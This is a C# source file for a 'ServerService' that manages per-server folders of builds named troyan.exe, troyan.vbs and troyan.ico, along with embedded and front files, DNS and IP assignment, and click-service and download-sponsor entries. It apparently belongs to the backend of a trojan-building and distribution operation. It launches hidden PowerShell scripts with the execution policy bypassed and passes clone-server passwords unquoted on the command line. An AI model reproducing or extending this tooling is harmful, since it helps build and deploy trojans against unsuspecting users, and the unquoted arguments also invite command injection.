using System.Diagnostics;
using System.Text;
using System.Text.Json;
using System.Text.Json.Serialization;

namespace model;

public class ServerResult
{
    public ServerModel? ServerModel;

    public Exception? Exception;
}

public class ServerService
{
    public ServerService()
    {

    }

    public string SysScript(string scriptName)
    {
        return Path.Combine(ServerModelLoader.SysDirStatic, scriptName + ".ps1");
    }

    internal static string ServerDir(string serverName)
    {
        return Path.Combine(ServerModelLoader.RootDataStatic, serverName);
    }

    public string EmbeddingsDir(string serverName)
    {
        return Path.Combine(ServerDir(serverName), "embeddings");
    }

    public string FrontDir(string serverName)
    {
        return Path.Combine(ServerDir(serverName), "front");
    }

    internal static string DataFile(string serverName)
    {
        return Path.Combine(ServerDir(serverName), "server.json");
    }

    public string GetIcon(string serverName)
    {
        return Path.Combine(ServerDir(serverName), "troyan.ico");
    }

    public string GetExe(string serverName)
    {
        return Path.Combine(ServerDir(serverName), "troyan.exe");
    }

    public string BuildExe(string serverName, string url)
    {
        return Path.Combine(ServerDir(serverName), "troyan.exe");
    }

    public string GetVbs(string serverName)
    {
        return Path.Combine(ServerDir(serverName), "troyan.vbs");
    }

    public string BuildVbs(string serverName, string url)
    {
        return Path.Combine(ServerDir(serverName), "troyan.vbs");
    }

    public string GetEmbedding(string serverName, string embeddingName)
    {
        return Path.Combine(EmbeddingsDir(serverName), embeddingName);
    }

    public void DeleteEmbedding(string serverName, string embeddingName)
    {
        File.Delete(GetEmbedding(serverName, embeddingName));
    }

    public string GetFront(string serverName, string embeddingName)
    {
        return Path.Combine(FrontDir(serverName), embeddingName);
    }

    public void DeleteFront(string serverName, string embeddingName)
    {
        File.Delete(GetFront(serverName, embeddingName));
    }

    internal static JsonSerializerOptions JSO = new()
        { WriteIndented = true, DefaultIgnoreCondition = JsonIgnoreCondition.WhenWritingNull };

    public ServerModel GetServerLite(string serverName)
    {
        var server = JsonSerializer.Deserialize<ServerModel>(File.ReadAllText(DataFile(serverName)), JSO)!;
        return server;
    }

    public void SaveServerLite(string serverName, ServerModel server)
    {
        File.WriteAllText(DataFile(serverName),
            JsonSerializer.Serialize(server, JSO));
    }

    public enum Get
    {
        RaiseError = 0,
        LoadDefault = 1,
        CreteNew = 2
    }

    public ServerResult GetServer(string serverName, bool updateDns, Get mode, string alias = "", string pass = "")
    {
        if (mode == Get.CreteNew)
        {
        }
        else
        {
            if (!Directory.Exists(ServerDir(serverName)))
                return new ServerResult() { Exception = new DirectoryNotFoundException(serverName) };
        }

        var server = new ServerModel();
        server.Server = serverName;
        try
        {
            try
            {
                server = JsonSerializer.Deserialize<ServerModel>(File.ReadAllText(DataFile(serverName)), JSO)!;
                if (server.StartUrls == null)
                    server.StartUrls = new List<string>();
                if (server.StartDownloads == null)
                    server.StartDownloads = new List<string>();
                if (server.Pushes == null)
                    server.Pushes = new List<string>();
                if (server.Tabs == null)
                    server.Tabs = new List<TabModel>();
                if (server.DnSponsor == null)
                    server.DnSponsor = new List<DnSponsorModel>();
            }
            catch (Exception e)
            {
                if (mode == Get.CreteNew)
                {
                    Dev.DefaultServer(serverName);
                    server = JsonSerializer.Deserialize<ServerModel>(File.ReadAllText(DataFile(serverName)), JSO)!;
                }
                else
                {
                    server.LastResult = e.Message;
                    return new ServerResult() { Exception = e, ServerModel = server };
                }
            }
            
            UpdateIpDomains(server);
                
            UpdateDNS(server);
                
            UpdateTabs(server);
                
            UpdateBux(server);
                
            UpdateDnSponsor(server);
                
            server.Embeddings = new List<string>();
            if (Directory.Exists(EmbeddingsDir(serverName)))
                server.Embeddings = Directory.GetFiles(EmbeddingsDir(serverName)).Select(a => Path.GetFileName(a))
                    .ToList();

            server.Front = new List<string>();
            if (Directory.Exists(FrontDir(serverName)))
                server.Front = Directory.GetFiles(FrontDir(serverName)).Select(a => Path.GetFileName(a))
                    .ToList();

            SaveServerLite(serverName, server);

            return new ServerResult() { ServerModel = server };
        }
        catch (Exception e)
        {
            server.LastResult = e.Message;
            return new ServerResult() { Exception = e, ServerModel = server };
        }
    }
        
    public void UpdateTabs(ServerModel server)
    {
        var profilesDir = Path.Combine(server.UserDataDir, "profiles");
        if (System.IO.Directory.Exists(profilesDir) == false)
        {
            System.IO.Directory.CreateDirectory(profilesDir);
        }
        var profs = System.IO.Directory.GetDirectories(profilesDir);
        var result = new List<TabModel>();
        foreach (var profile in profs)
        {
            var tab = new TabModel(server);
            tab.Id = System.IO.Path.GetFileName(profile);
            tab._server = server;
            result.Add(tab);
        }

        if (result.Count == 0)
        {
            result.Add(new TabModel(server){Id="default"});
        }
            
        server.Tabs = result;
    }

    public void UpdateBux(ServerModel server)
    {
        if (server.Bux == null)
            server.Bux = new List<BuxModel>();
        if (server.Bux.FirstOrDefault(a => a.Id == "unu.im") == null)
            server.Bux.Add(new BuxModel(){Id="unu.im"});
    }
        
    public void UpdateDnSponsor(ServerModel server)
    {
        if (server.DnSponsor == null)
            server.DnSponsor = new List<DnSponsorModel>();
        if (server.DnSponsor.FirstOrDefault(a => a.Id == "ufiler.biz") == null)
            server.DnSponsor.Add(new DnSponsorModel(){Id="ufiler.biz"});
    }

    public void UpdateIpDomains(ServerModel server)
    {
        server.Interfaces = Dev.GetPublicIPv4Addresses();
        for (int i = server.DomainIps.Count - 1; i >= 0; i--)
        {
            var domainIp = server.DomainIps[i];
            if (string.IsNullOrEmpty(domainIp.Index))
                domainIp.Index = Guid.NewGuid().ToString();
            var cnt = server.DomainIps.Count(a => a.Name == domainIp.Name);
            if (cnt >= 2 || string.IsNullOrEmpty(domainIp.Name))
            {
                domainIp.Name = Guid.NewGuid().ToString();
            }
        }

        for (int i = server.DomainIps.Count - 1; i >= 0; i--)
        {
            var allowedIp = server.Interfaces.Except([server.ServerIp]).ToArray();
            var allIp = server.DomainIps.Select(a => a.IP).ToList();
            var domainIp = server.DomainIps[i];
            var cnt = server.DomainIps.Count(a => a.IP == domainIp.IP);
            if (!allowedIp.Contains(domainIp.IP) || cnt >= 2)
            {
                var freeIp = allowedIp.Except(allIp).FirstOrDefault() ?? "127.0.0.1";
                server.DomainIps[i].IP = freeIp;
            }
        }
    }
        
    public void UpdateDNS(ServerModel server)
    {
        var first = server.Interfaces.Count >= 1 ? server.Interfaces[0] : server.ServerIp;
        server.PrimaryDns = first;
        server.SecondaryDns = server.PrimaryDns;
        if (server.Interfaces.Count >= 2)
            server.SecondaryDns = server.Interfaces[1];
        if (!string.IsNullOrEmpty(server.StrahServer))
            server.SecondaryDns = server.StrahServer;
    }

    public string CloneServerRequest(string serverName, ServerModel serverModel)
    {
        SaveServerLite(serverName, serverModel);
        var p = GetServerLite(serverName);
        try
        {
            System.IO.File.Delete(p.UserCloneLog);
        }
        catch (Exception e)
        {
        }
        var sa = new ProcessStartInfo
        {
            FileName = ServerModelLoader.Cloner,
            Arguments = $"{serverName}",
            CreateNoWindow = true,
            UseShellExecute = false,
            RedirectStandardOutput = false,
            RedirectStandardError = false
        };
        Process process = new Process { StartInfo = sa };
        process.Start();
        return p.UserCloneLog;
    }
    
    public string CloneServer(string serverName)
    {
        var p = GetServerLite(serverName);
        (string, object)[] prms = [
        new ValueTuple<string, string>("serverIp", p.CloneModel.CloneServerIp),
        new ValueTuple<string, string>("user", p.CloneModel.CloneUser),
        new ValueTuple<string, string>("password",p.CloneModel.ClonePassword),
        ];
        var sc = SysScript("install");
        try
        {
            System.IO.File.Delete(p.UserCloneLog);
        }
        catch (Exception e)
        {
        }
        using (Process process = new Process())
        {
            process.StartInfo.FileName = "powershell.exe";
            process.StartInfo.Arguments = $"-NoProfile -ExecutionPolicy Bypass -file \"{sc}\" " +
                                          string.Join(" ", prms.Select(p => $"-{p.Item1} {p.Item2}"));
            process.StartInfo.RedirectStandardOutput = true;
            process.StartInfo.RedirectStandardError = true;
            process.StartInfo.UseShellExecute = false;
            process.StartInfo.CreateNoWindow = true;
            process.StartInfo.WorkingDirectory = ServerDir(serverName);

            StringBuilder output = new StringBuilder();
            StringBuilder error = new StringBuilder();

            process.OutputDataReceived += (sender, e) =>
            {
                if (!string.IsNullOrEmpty(e.Data))
                {
                    System.IO.File.AppendAllLines(p.UserCloneLog, new []{ e.Data});
                }
            };

            process.ErrorDataReceived += (sender, e) =>
            {
                if (!string.IsNullOrEmpty(e.Data))
                {
                    System.IO.File.AppendAllLines(p.UserCloneLog, new []{ e.Data});
                }
            };

            process.Start();

            process.BeginOutputReadLine();
            process.BeginErrorReadLine();

            process.WaitForExit();

            var res = error.ToString() + "\r\n" + output.ToString();

            return res;
        }
    }

    public string PostServer(string serverName, ServerModel serverModel, bool realWork, string action, string kill)
    {
        if (!Directory.Exists(ServerDir(serverName)))
            return $"Server {serverName} is not registered";
        
        UpdateIpDomains(serverModel);
            
        UpdateDNS(serverModel);
            
        UpdateTabs(serverModel);
            
        UpdateBux(serverModel);
            
        UpdateDnSponsor(serverModel);

        SaveServerLite(serverName, serverModel);

        if (realWork == false)
        {
            var useAction = action;
            var p = GetServerLite(serverName);
            if (p.IsAtWork)
            {
                if (p.Operation == "apply")
                    useAction = "apply";
            }
            serverModel.MarkOperation(useAction);
            SaveServerLite(serverName, serverModel);
            var process = new Process
            {
                StartInfo = new ProcessStartInfo
                {
                    FileName = ServerModelLoader.Refiner,
                    Arguments = $"{serverName}",
                    CreateNoWindow = true,
                    UseShellExecute = false,
                    RedirectStandardOutput = false,
                    RedirectStandardError = false 
                }
            };
            process.Start();
        }
        else
        {
            if (action != "none")
            {
                var script = SysScript("compile");
                var result = RunScript(serverModel.Server, script,
                    new ValueTuple<string, object>("serverName", serverModel.Server),
                    new ValueTuple<string, object>("action", action), new ValueTuple<string, object>("kill", kill),
                    new ValueTuple<string, object>("refiner","refiner"));

                return result;
            }
        }
        return "OK";
    }

    public string Reboot()
    {
        var result = "";
        var dirs = System.IO.Directory.GetDirectories(@"C:\data");
        foreach (var dir in dirs)
        {
            try
            {
                var server = System.IO.Path.GetFileName(dir);
                result += RunScript(server, SysScript("reboot"),
                    new ValueTuple<string, object>("serverName", server));
            }
            catch (Exception e)
            {
                result += e.Message;
            }
        }
        return result;
    }

    public void ForegroundServer(string serverName)
    {
        var srv = GetServerLite(serverName);
        if (srv.HasToWork)
        {
            try
            {
                var res = GetServer(serverName, true, Get.RaiseError);
                if (res.Exception != null)
                    throw res.Exception;
                srv = res.ServerModel;
                srv.LastResult = PostServer(serverName, srv, true, srv.Operation, "don't");
            }
            catch (Exception e)
            {
                Console.WriteLine(e);
            }
            srv.MarkReady();
            SaveServerLite(serverName, srv);
        }
    }

    public ServerResult RefineServerLite(string serverName)
    {
        var srv = GetServer(serverName, false, Get.RaiseError);
        if (srv.Exception != null)
            Console.WriteLine(srv.Exception.Message);
        PostServer(serverName, srv.ServerModel, true, "none", "don't");
        Console.WriteLine(srv.ServerModel.UserDataDir);
        return srv;
    }

    public ServerResult RefineServer(string serverName, string action = "exe")
    {
        var srv = GetServer(serverName, true, Get.RaiseError);
        if (srv.Exception != null)
            Console.WriteLine(srv.Exception.Message);
        if (srv.ServerModel != null)
            Console.WriteLine(srv.ServerModel.RootDir);
        if (srv.Exception != null)
            return srv;
        if (srv.ServerModel == null)
            return srv;
        PostServer(serverName, srv.ServerModel, true ,action, "don't");
        Console.WriteLine(srv.ServerModel.UserDataDir);
        return srv;
    }


    public string RunScript(string server, string scriptfILE, params (string Name, object Value)[] parameters)
    {
        using (Process process = new Process())
        {
            process.StartInfo.FileName = "powershell.exe";
            process.StartInfo.Arguments = $"-NoProfile -ExecutionPolicy Bypass -file \"{scriptfILE}\" " +
                                          string.Join(" ", parameters.Select(p => $"-{p.Name} {p.Value}"));
            process.StartInfo.RedirectStandardOutput = true;
            process.StartInfo.RedirectStandardError = true;
            process.StartInfo.UseShellExecute = false;
            process.StartInfo.CreateNoWindow = true;
            process.StartInfo.WorkingDirectory = ServerDir(server);

            StringBuilder output = new StringBuilder();
            StringBuilder error = new StringBuilder();

            process.OutputDataReceived += (sender, e) =>
            {
                if (!string.IsNullOrEmpty(e.Data))
                {
                    output.AppendLine(e.Data);
                }
            };

            process.ErrorDataReceived += (sender, e) =>
            {
                if (!string.IsNullOrEmpty(e.Data))
                {
                    error.AppendLine(e.Data);
                }
            };

            process.Start();

            process.BeginOutputReadLine();
            process.BeginErrorReadLine();

            process.WaitForExit();

            var res = error.ToString() + "\r\n" + output.ToString();

            return res;
        }
    }
}